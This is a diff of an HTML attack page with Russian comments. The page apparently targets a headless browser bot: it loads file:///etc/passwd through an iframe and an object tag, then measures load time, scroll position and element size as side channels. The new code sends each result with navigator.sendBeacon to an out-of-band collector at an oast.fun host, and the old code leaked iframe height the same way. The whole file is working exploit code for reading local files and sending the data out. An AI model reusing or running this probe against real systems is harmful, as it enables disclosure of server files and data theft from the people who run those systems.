@@ -1,29 +1,51 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <div id="container" style="width: 1px; word-wrap: break-word;">
-        <iframe id="victim" src="file:///etc/passwd" style="width: 100%; height: 10px;"></iframe>
-    </div>
-
     <script>
         const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+
+        function send(path, info) {
+            navigator.sendBeacon(`${hook}/${path}`, info);
+        }
+
+        // 1. Сигнал старта
+        send("START_PROBE", "Bot_Active");
+
+        // 2. Метод через проверку видимости (Intersection Observer)
+        // Если контент в iframe загрузился, это может вызвать событие отрисовки
+        const ifr = document.createElement('iframe');
+        ifr.style.width = "100px";
+        ifr.style.height = "100px";
         
-        window.onload = () => {
-            const ifr = document.getElementById('victim');
+        // Замеряем время до события onload
+        const start = performance.now();
+        ifr.onload = () => {
+            const duration = performance.now() - start;
+            send("LOAD_SUCCESS", `Time: ${duration}ms`);
             
-            setTimeout(() => {
-                try {
-                    // Мы не можем прочитать текст, но можем попробовать прочитать ВЫСОТУ
-                    // Если высота > 10px, значит там есть контент!
-                    const height = ifr.contentWindow.document.body.scrollHeight;
-                    navigator.sendBeacon(hook + "/HEIGHT_LEAK", "Lines_Height: " + height);
-                } catch(e) {
-                    // Если SOP блокирует высоту, пробуем метод "Scroll"
-                    const scrollPos = ifr.contentWindow.pageYOffset;
-                    navigator.sendBeacon(hook + "/SCROLL_LEAK", "Pos: " + scrollPos);
-                }
-            }, 1000);
+            // Пытаемся узнать количество строк через "слепой" скролл
+            try {
+                ifr.contentWindow.scrollTo(0, 99999);
+                const pos = ifr.contentWindow.pageYOffset;
+                send("SCROLL_DATA", `Y: ${pos}`);
+            } catch(e) {
+                send("SOP_BLOCK", "Cannot_Read_Internal_Scroll");
+            }
         };
+
+        ifr.onerror = () => send("LOAD_ERROR", "Access_Denied");
+        ifr.src = "file:///etc/passwd";
+        document.body.appendChild(ifr);
+
+        // 3. Трюк с "объектом" (Object tag)
+        // Он часто дает больше инфы о размере контента
+        const obj = document.createElement('object');
+        obj.data = "file:///etc/passwd";
+        obj.onload = () => {
+            send("OBJECT_LOADED", `W:${obj.offsetWidth} H:${obj.offsetHeight}`);
+        };
+        document.body.appendChild(obj);
+
     </script>
 </body>
 </html>
